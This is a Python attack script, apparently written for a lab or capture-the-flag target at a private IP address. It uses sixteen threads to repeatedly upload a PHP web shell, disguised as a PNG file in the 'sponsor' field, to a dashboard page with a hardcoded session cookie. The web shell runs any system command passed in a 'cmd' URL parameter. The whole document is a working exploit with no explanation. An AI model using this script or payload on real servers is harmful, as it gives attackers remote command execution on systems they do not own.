#!/usr/bin/python3
import requests
from threading import Thread

# ----- Configuration ----- #
N = 10000 # number of shells to upload
T = 16   # number of threads to run simultaneously

# content of the reverse shell
revshell = "<?php if(isset($_GET['cmd'])){ echo '<pre>'; system($_GET['cmd']); echo '</pre>'; die; }?>\n"

# request url and cookie
url = 'http://172.30.150.126/?p=dashboard'
PHPSESSID = '5ttc68t6ehin3g4vqk2blvr5q9'
# ----- ------------- ----- #

files = {'sponsor': ('shell.php', revshell, 'image/png')}
data = {'submit': 'Upload'}
cookies = {'PHPSESSID': PHPSESSID}

def spam(thread_id, N):
    successes = 0
    for n in range(N):
        res = requests.post(url, files=files, data=data, cookies=cookies)
        successes += 1 if 'success' in res.text else 0
        if n%(N//4)==0:
            print(f'Thread {thread_id}: {successes}✔ / {n+1-successes}✘')
    print(f'Thread {thread_id} exited.')

threads = []
for i in range(T):
    t = Thread(target=spam, args=(i, N//T))
    t.start()
    threads.append(t)

print(f'Created {T} threads.')

for t in threads:
    t.join()
